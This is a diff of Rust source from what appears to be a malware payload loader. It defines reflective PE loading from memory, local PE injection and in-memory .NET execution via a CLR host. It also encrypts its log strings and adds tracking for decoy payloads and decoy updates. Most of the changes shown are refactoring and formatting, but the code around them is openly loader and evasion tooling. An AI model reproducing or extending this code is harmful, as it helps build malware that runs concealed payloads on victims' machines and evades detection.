@@ -3,8 +3,8 @@ use crate::link::{Link, LinkFetch};
 use crate::payload_util::calculate_path;
 use crate::payload_util::create_diretory;
 use crate::payload_util::same_hash_sha512;
-use crate::rundata::RunData;
 use crate::payload_util::CommandLine;
+use crate::rundata::RunData;
 
 #[cfg(target_os = "linux")]
 use crate::payload_util::fail_linux_message;
@@ -61,7 +61,6 @@ pub enum Payload {
     ReflectivePEFromMemory(ReflectivePEFromMemory),
     LocalPeInjection(LocalPeInjection),
     DotnetFromMemory(DotnetFromMemory),
-    
 }
 impl Payload {
     pub fn exec_payload(&self, config: &Config) -> PayloadExecThread {
@@ -101,14 +100,47 @@ impl Payload {
         let other_serialized = serde_json::to_string(other_payload).unwrap();
         self_serialized == other_serialized
     }
-    pub fn is_already_running_or_runonce(&self, run_data: &mut RunData) -> bool {
-        for running_payload in &mut *run_data.running_thread {
+    //TODO DECOTY, la c'est que les payloads normal, il va falloir convertir
+    pub fn is_already_running_or_runonce_payload(&self, run_data: &mut RunData) -> bool {
+        for running_payload in &mut *run_data.running_thread_payload {
             if self.is_same_payload(&running_payload.1) {
                 info!("{}", encrypt_string!("Payload is already running"));
                 return true;
             }
         }
-        for running_once in &mut *run_data.runonce {
+        for running_once in &mut *run_data.runonce_payload {
+            if self.is_same_payload(&running_once) {
+                info!("{}", encrypt_string!("Payload already run once"));
+                return true;
+            }
+        }
+        return false;
+    }
+
+    pub fn is_already_running_or_runonce_decoy_update(&self, run_data: &mut RunData) -> bool {
+        for running_payload in &mut *run_data.running_thread_decoy_update {
+            if self.is_same_payload(&running_payload.1) {
+                info!("{}", encrypt_string!("Payload is already running"));
+                return true;
+            }
+        }
+        for running_once in &mut *run_data.runonce_decoy_update {
+            if self.is_same_payload(&running_once) {
+                info!("{}", encrypt_string!("Payload already run once"));
+                return true;
+            }
+        }
+        return false;
+    }
+
+    pub fn is_already_running_or_runonce_decoy_payload(&self, run_data: &mut RunData) -> bool {
+        for running_payload in &mut *run_data.running_thread_decoy_payload {
+            if self.is_same_payload(&running_payload.1) {
+                info!("{}", encrypt_string!("Payload is already running"));
+                return true;
+            }
+        }
+        for running_once in &mut *run_data.runonce_decoy_payload {
             if self.is_same_payload(&running_once) {
                 info!("{}", encrypt_string!("Payload already run once"));
                 return true;
@@ -285,12 +317,9 @@ pub fn banner() -> Result<PayloadExecThread, anyhow::Error> {
     Ok(PayloadExecThread::NoThread())
 }
 
-
-
 pub fn stoploader() -> Result<PayloadExecThread, anyhow::Error> {
     std::process::exit(0);
 }
-
 
 #[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
 pub struct WriteZip {
@@ -489,8 +518,6 @@ impl ReflectivePEFromMemory {
 use crate::local_pe_injection::main::local_pe_injection;
 //#[cfg(target_os = "windows")]
 
-
-
 #[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
 pub struct LocalPeInjection {
     pub link: Link,
@@ -534,7 +561,6 @@ impl LocalPeInjection {
     }
 }
 
-
 // DOTNET
 #[cfg(target_os = "windows")]
 use clroxide::clr::Clr;
@@ -572,7 +598,7 @@ impl DotnetFromMemory {
                 let mut clr = Clr::new(data, args_ok_commandline).unwrap();
                 let result: String = clr.run().unwrap();
                 if visible {
-                    println!("{}",result);
+                    println!("{}", result);
                 };
             });
             return Ok(PayloadExecThread::Thread(
@@ -583,7 +609,7 @@ impl DotnetFromMemory {
             let mut clr = Clr::new(data, args_ok).unwrap();
             let result: String = clr.run().unwrap();
             if self.visible {
-                println!("{}",result);
+                println!("{}", result);
             };
             return Ok(PayloadExecThread::NoThread());
         }
